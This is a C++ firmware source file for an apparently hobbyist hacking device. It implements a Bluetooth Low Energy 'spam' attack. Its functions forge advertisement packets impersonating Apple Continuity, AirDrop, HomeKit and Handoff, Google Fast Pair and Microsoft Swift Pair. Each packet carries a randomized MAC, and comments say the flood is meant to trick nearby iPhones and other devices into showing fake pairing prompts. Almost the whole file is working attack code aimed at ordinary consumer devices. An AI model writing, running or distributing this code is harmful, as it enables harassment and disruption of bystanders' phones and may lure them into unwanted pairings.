#include "ble_spam.h"
#include "config.h"
#include "rtc_clock.h"
#include "tx_arm.h"
#include <NimBLEDevice.h>
#include <LittleFS.h>

namespace BleSpam {

namespace {
volatile bool g_spamActive = false;
volatile uint32_t g_packetCount = 0;
NimBLEAdvertising *g_pAdvertising = nullptr;
}

void generateContinuityPayload(uint8_t *buf, uint8_t &len) {
    // Aggressive Apple Continuity with multiple spoofed variants
    buf[0] = 0xFF;           // Manufacturer Specific Data
    buf[1] = 0x4C;           // Apple Inc. LSB
    buf[2] = 0x00;           // Apple Inc. MSB

    // Continuity type (varies: 0x01-0x09 for different Apple services)
    uint8_t contType = random(0x01, 0x0A);
    buf[3] = contType;
    buf[4] = 0x00;

    // Random sequence ID (mimics real device state changes)
    uint32_t seq = random(0xFFFFFFFF);
    buf[5] = (seq >> 24) & 0xFF;
    buf[6] = (seq >> 16) & 0xFF;
    buf[7] = (seq >> 8) & 0xFF;
    buf[8] = seq & 0xFF;

    // Status flags (connected/available + power level)
    buf[9] = 0x01 | (random(0x00, 0x08) << 1);

    // Fake RSSI (appears strong = device nearby = more convincing)
    buf[10] = random(0xC0, 0xFF);

    // Random device identifier (makes each packet look like different device)
    for (int i = 11; i < 19; i++) {
        buf[i] = random(0x00, 0xFF);
    }

    len = 19;
}

void generateFastPairPayload(const String &ssid, uint8_t *buf, uint8_t &len) {
    buf[0] = 0x16;           // Google Fast Pair type
    buf[1] = 0xE1;           // Vendor ID: Google (0x00E1 LE)
    buf[2] = 0x00;           //

    uint16_t modelId = random(0x0001, 0xFFFF);
    buf[3] = (modelId >> 8) & 0xFF;
    buf[4] = modelId & 0xFF;

    uint8_t flags = 0x00;
    if (random(0, 2)) flags |= 0x04;  // discoverable
    if (random(0, 2)) flags |= 0x01;  // show UI indicator
    buf[5] = flags;

    len = 6;
}

void generateSwiftPairPayload(uint8_t *buf, uint8_t &len) {
    buf[0] = 0xFF;           // Microsoft beacon type
    buf[1] = 0x06;           // Microsoft
    buf[2] = 0x00;           // Microsoft

    uint16_t devType = random(0x0001, 0xFFFF);
    buf[3] = (devType >> 8) & 0xFF;
    buf[4] = devType & 0xFF;

    uint8_t subType = random(0x01, 0x05);
    buf[5] = subType;

    len = 6;
}

void generateGenericPairingPayload(uint8_t *buf, uint8_t &len) {
    buf[0] = 0x01;           // Generic flags
    buf[1] = 0x06;           // LE General Discoverable, BR/EDR Not Supported

    buf[2] = 0xFF;           // Manufacturer Specific Data
    uint16_t mfg = random(0x004C, 0x0400);
    buf[3] = mfg & 0xFF;
    buf[4] = (mfg >> 8) & 0xFF;

    for (int i = 5; i < 15; i++) {
        buf[i] = random(0x00, 0xFF);
    }

    len = 15;
}

void generateAirDropPayload(uint8_t *buf, uint8_t &len) {
    // Aggressive AirDrop - spoofed MacBook/iPhone nearby offering file transfer
    buf[0] = 0xFF;
    buf[1] = 0x4C;           // Apple
    buf[2] = 0x00;

    buf[3] = 0x05;           // AirDrop type
    buf[4] = 0x12;           // Version indicator

    // Fake device hash (different each packet = looks like multiple devices)
    for (int i = 5; i < 15; i++) {
        buf[i] = random(0x00, 0xFF);
    }

    // Capabilities + status (appears ready to receive)
    buf[15] = 0x01 | (random(0, 0x02) << 1);

    len = 16;
}

void generateHomeKitPayload(uint8_t *buf, uint8_t &len) {
    // HomeKit accessory in pairing mode - very aggressive
    buf[0] = 0xFF;
    buf[1] = 0x4C;
    buf[2] = 0x00;

    buf[3] = 0x06;           // HomeKit type
    buf[4] = 0x01;           // Protocol version

    // Random accessory ID (looks like different HomeKit device each time)
    for (int i = 5; i < 11; i++) {
        buf[i] = random(0x00, 0xFF);
    }

    // Status flags: 0x01 = unpaired/pairing mode (very attractive to iPhone)
    buf[11] = 0x01 | random(0x00, 0x04);

    // Setup code hash (looks legitimate)
    buf[12] = random(0x00, 0xFF);
    buf[13] = random(0x00, 0xFF);

    len = 14;
}

void generateHandoffPayload(uint8_t *buf, uint8_t &len) {
    // Handoff protocol - trick iPhone into showing "Continue on iPhone" prompts
    buf[0] = 0xFF;
    buf[1] = 0x4C;
    buf[2] = 0x00;

    buf[3] = 0x0C;           // Handoff/Continuity action type
    buf[4] = 0x01;           // Version

    // Fake activity ID (different each time)
    for (int i = 5; i < 13; i++) {
        buf[i] = random(0x00, 0xFF);
    }

    // App type (Safari, Mail, Notes, etc)
    buf[13] = random(0x01, 0x0F);

    len = 14;
}

void randomizeBLE_MAC(uint8_t *addr) {
    for (int i = 0; i < 6; i++) {
        addr[i] = random(0x00, 0xFF);
    }
    addr[0] &= 0xFE;  // ensure random private address (bit 0 = 0)
}

void logSpamActivity(const String &logFile, const SpamConfig &cfg, uint32_t packetsSent, uint32_t elapsedMs) {
    if (!LittleFS.exists(LOG_DIR)) {
        LittleFS.mkdir(LOG_DIR);
    }

    File f = LittleFS.open(logFile, "a");
    if (!f) return;

    String typeStr;
    switch (cfg.type) {
        case CONTINUITY:      typeStr = "Continuity"; break;
        case FAST_PAIR:       typeStr = "FastPair"; break;
        case SWIFT_PAIR:      typeStr = "SwiftPair"; break;
        case GENERIC_PAIRING: typeStr = "Generic"; break;
    }

    String line = RtcClock::isoTimestamp() + ",BLE_SPAM," + typeStr + ",";
    line += String(cfg.packetsPerSec) + "pps,";
    line += String(packetsSent) + " packets sent," + String(elapsedMs) + "ms";

    if (!cfg.customSSID.isEmpty()) {
        line += "," + cfg.customSSID;
    }

    f.println(line);
    f.close();
}

SpamResult spam(const SpamConfig &config) {
    SpamResult result = {false, 0, 0, "", ""};

    if (!TxArm::isArmed()) {
        result.error = "TX not armed (hold BACK button)";
        return result;
    }

    g_spamActive = true;
    g_packetCount = 0;

    String logFile = HANDSHAKE_CAPTURE_DIR;
    logFile += "/ble_spam.csv";

    uint32_t startTime = millis();
    uint32_t nextPacketTime = startTime;
    uint32_t packetInterval = 1000 / config.packetsPerSec;
    uint8_t currentChannel = config.targetChannel;

    uint8_t payload[31];
    uint8_t payloadLen = 0;

    while (g_spamActive && (millis() - startTime) < config.durationMs) {
        uint32_t now = millis();

        if (now >= nextPacketTime) {
            if (TxArm::isArmed()) {
                // Generate random BLE MAC
                uint8_t bleAddr[6];
                randomizeBLE_MAC(bleAddr);

                // Generate payload based on spam type
                // For CONTINUITY: aggressive Apple targeting (rotates through all Apple services)
                if (config.type == CONTINUITY) {
                    uint8_t appleType = (g_packetCount % 4);
                    switch (appleType) {
                        case 0:
                            generateContinuityPayload(payload, payloadLen);
                            break;
                        case 1:
                            generateAirDropPayload(payload, payloadLen);
                            break;
                        case 2:
                            generateHomeKitPayload(payload, payloadLen);
                            break;
                        case 3:
                            generateHandoffPayload(payload, payloadLen);
                            break;
                    }
                } else {
                    switch (config.type) {
                        case CONTINUITY:  // Already handled above
                            break;
                        case FAST_PAIR:
                            generateFastPairPayload(config.customSSID, payload, payloadLen);
                            break;
                        case SWIFT_PAIR:
                            generateSwiftPairPayload(payload, payloadLen);
                            break;
                        case GENERIC_PAIRING:
                            generateGenericPairingPayload(payload, payloadLen);
                            break;
                    }
                }

                // Setup NimBLE advertisement with payload
                if (!g_pAdvertising) {
                    g_pAdvertising = NimBLEDevice::getAdvertising();
                }

                NimBLEAdvertisementData advData;
                advData.setFlags(0x06);
                advData.addData(std::string((const char *)payload, payloadLen));

                g_pAdvertising->setAdvertisementData(advData);

                // Start advertising burst
                g_pAdvertising->start(0, nullptr, nullptr);
                delay(5);
                g_pAdvertising->stop();

                g_packetCount++;
                result.packetsSent++;
            } else {
                // TX disarmed, stop immediately
                g_spamActive = false;
                result.error = "TX disarmed during attack";
                break;
            }

            nextPacketTime += packetInterval;
        }

        delay(1);
    }

    g_spamActive = false;
    result.success = (result.packetsSent > 0);
    result.elapsedMs = millis() - startTime;
    result.logFile = logFile;

    if (result.success) {
        logSpamActivity(logFile, config, result.packetsSent, result.elapsedMs);
    }

    return result;
}

void stop() {
    g_spamActive = false;
    if (g_pAdvertising) {
        g_pAdvertising->stop();
    }
}

bool isActive() {
    return g_spamActive;
}

uint32_t getPacketCount() {
    return g_packetCount;
}

} // namespace BleSpam
